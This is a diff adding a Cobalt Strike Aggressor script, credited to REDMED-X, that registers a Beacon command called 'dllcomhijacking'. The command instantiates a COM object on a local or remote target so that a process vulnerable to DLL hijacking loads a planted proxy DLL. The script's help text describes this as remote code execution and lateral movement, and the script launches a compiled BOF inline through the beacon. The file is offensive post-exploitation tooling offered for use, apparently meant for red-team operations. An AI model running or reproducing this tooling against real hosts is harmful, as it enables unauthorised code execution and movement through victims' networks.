@@ -1,0 +1,40 @@
+# author REDMED-X
+
+beacon_command_register(
+	"dllcomhijacking", "Leverage DLL Hijacking by instantiating a COM object on a target host",
+	"INFO:\nInstantiate a COM object on a target host that will start the associated process which is vulnerable to DLL Hijacking. This allows for (remote) code execution and is therefore a good lateral movement technique.\nReminder: place the proxy DLL in the correct location before running this tool.\n\n" .
+	"ARGUMENTS:\n[<CLSID>]: The CLSID of the COM class that is associated with the vulnerable process.\n[<target>]: The FQDN, hostname or IP of the target host (can be remote- or the local host).\n\n" .
+	"USAGE:\ndllcomhijacking <CLSID> <target>\n\n" .
+	"EXAMPLES:\ndllcomhijacking {73FDDC80-AEA9-101A-98A7-00AA00374959} target.example.local\n\n");
+	
+alias dllcomhijacking {
+    $bid = $1;
+    $clsid = $2;
+    $target = $3;
+
+    if ($clsid eq "") {
+        berror($bid, "Please specify one TEXT\n");
+        return;
+    }
+
+    if ($target eq "") {
+		berror($bid, "Please specify the TEXT.\n");
+		return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("dllcomhijacking.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "ZZ", $clsid, $target);
+
+    blog($bid, "Tasked to instantiate a (remote) COM object..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+
+
